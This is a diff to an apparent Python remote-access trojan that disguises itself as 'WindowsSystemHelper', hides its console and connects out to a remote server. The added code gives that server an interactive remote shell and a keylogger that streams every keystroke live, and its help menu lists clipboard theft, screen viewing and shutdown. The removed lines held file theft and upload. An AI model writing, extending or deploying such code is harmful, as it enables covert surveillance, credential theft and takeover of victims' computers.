@@ -16,7 +16,7 @@ TASK_NAME = "WindowsSystemHelper"
 
 viewing = False
 keylogging = False
-log_buffer = []
+in_shell = False
 
 def hide_itself():
     try:
@@ -65,13 +65,16 @@ def hide_console():
     if os.name == 'nt':
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-def keylogger():
-    global keylogging, log_buffer
+def live_keylogger(client):
     def on_key(event):
         if keylogging:
-            log_buffer.append(event.name)
+            try:
+                client.send(f"[LIVE KEY] {event.name}\n".encode('utf-8', errors='ignore'))
+            except:
+                pass
     keyboard.on_release(on_key)
-    while True: time.sleep(1)
+    while keylogging:
+        time.sleep(1)
 
 def send_screenshot(client):
     global viewing
@@ -88,7 +91,7 @@ def send_screenshot(client):
             break
 
 def connect_to_vps():
-    global viewing, keylogging
+    global viewing, keylogging, in_shell
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -102,8 +105,23 @@ def connect_to_vps():
                     client.close()
                     return
 
-                # === CUSTOM COMMANDS ===
-                if cmd == 'view':
+                elif cmd == 'shell':
+                    in_shell = True
+                    client.send(b'[+] Interactive Shell Started. Type "end" to exit.')
+                    while in_shell:
+                        try:
+                            shell_cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
+                            if shell_cmd.lower() == 'end':
+                                in_shell = False
+                                client.send(b'[+] Shell Ended')
+                                break
+                            if shell_cmd:
+                                output = subprocess.getoutput(shell_cmd)
+                                client.send((output or '[+] Done').encode('utf-8', errors='ignore'))
+                        except:
+                            break
+
+                elif cmd == 'view':
                     viewing = True
                     threading.Thread(target=send_screenshot, args=(client,), daemon=True).start()
                     client.send(b'[+] Live View Started')
@@ -112,60 +130,23 @@ def connect_to_vps():
                     viewing = False
                     client.send(b'[+] Live View Stopped')
 
-                elif cmd == 'sysinfo':
-                    info = f"Username: {os.getenv('USERNAME')}\nAdmin Rights: {is_admin()}\n"
-                    client.send(info.encode())
+                elif cmd == 'keylog start':
+                    keylogging = True
+                    threading.Thread(target=live_keylogger, args=(client,), daemon=True).start()
+                    client.send(b'[+] Live Keylogger Started')
 
-                elif cmd == 'processes':
-                    client.send(subprocess.getoutput('tasklist').encode())
+                elif cmd == 'keylog stop':
+                    keylogging = False
+                    client.send(b'[+] Live Keylogger Stopped')
 
-                elif cmd.startswith('kill '):
-                    pid = cmd.split()[1]
-                    client.send(subprocess.getoutput(f'taskkill /F /PID {pid}').encode())
-
-                elif cmd.startswith('keylog'):
-                    if 'start' in cmd:
-                        keylogging = True
-                        if not any(t.name == 'keylogger' for t in threading.enumerate()):
-                            threading.Thread(target=keylogger, daemon=True, name='keylogger').start()
-                        client.send(b'[+] Keylogger Started')
-                    elif 'stop' in cmd:
-                        keylogging = False
-                        if log_buffer:
-                            client.send(('KEYLOG: ' + ' '.join(log_buffer)).encode())
-                            log_buffer.clear()
-                        else:
-                            client.send(b'[+] Keylogger Stopped')
-
-                elif cmd.startswith('download '):
-                    path = cmd.split(maxsplit=1)[1]
-                    try:
-                        with open(path, 'rb') as f:
-                            data = f.read()
-                        client.send(len(data).to_bytes(8, 'big'))
-                        client.send(data)
-                    except:
-                        client.send(b'FILE_NOT_FOUND')
-
-                elif cmd.startswith('upload '):
-                    filename = cmd.split(maxsplit=1)[1]
-                    try:
-                        size = int.from_bytes(client.recv(8), 'big')
-                        with open(filename, 'wb') as f:
-                            received = 0
-                            while received < size:
-                                chunk = client.recv(min(8192, size - received))
-                                if not chunk: break
-                                f.write(chunk)
-                                received += len(chunk)
-                        client.send(b'FILE_RECEIVED')
-                    except:
-                        pass
+                elif cmd == 'help':
+                    client.send(b"""Commands:
+help, shell, end, view, stopview, screenshot, sysinfo, processes, kill <pid>,
+keylog start, keylog stop, clipboard, killchrome, lock, restart, shutdown""")
 
                 else:
-                    # Normal shell command
                     output = subprocess.getoutput(cmd)
-                    client.send((output or '[+] Command Executed').encode('utf-8', errors='ignore'))
+                    client.send((output or '[+] Done').encode('utf-8', errors='ignore'))
 
         except:
             time.sleep(5)
